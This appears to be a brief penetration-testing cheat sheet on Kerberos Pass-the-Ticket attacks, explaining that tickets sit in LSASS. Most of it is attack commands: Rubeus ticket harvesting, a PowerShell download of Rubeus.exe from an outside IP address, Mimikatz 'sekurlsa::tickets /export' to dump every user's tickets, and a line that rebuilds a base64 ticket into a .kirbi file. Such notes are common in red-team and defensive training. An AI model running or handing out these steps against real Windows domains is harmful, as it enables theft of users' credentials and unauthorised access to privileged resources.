# Pass The Ticket (Ticket Dump)
Don't create tickets, steal them from cache! With Pass-the-Ticket attacks, a threat actor won’t be forging Kerberos tickets. Instead, they will steal valid tickets that have already been created and issued, and pass them from one system to another in order to access resources as a legitimate, privileged user. 

The TGT and STs are located in the LSASS (Local Security Authority Subsystem Service)

User privilege: get TGT and TSs from user on system
Admin privilege: get all TGTs and TGs from all users on system

Requirements:
* Access to a machine

`Rubeus.exe harvest /interval:30`


Invoke-WebRequest -Uri "192.168.178.137:8000/Rubeus.exe" -OutFile "C:\Users\Administrator\Desktop"

User can request owned tickets, admin can request all.
`Mimikatz`
	sekurlsa::tickets /export
	exit
`\[IO.File\]::WriteAllBytes("ticket.kirbi", \[Convert\]::FromBase64String("<BASE64\_TICKET>"))`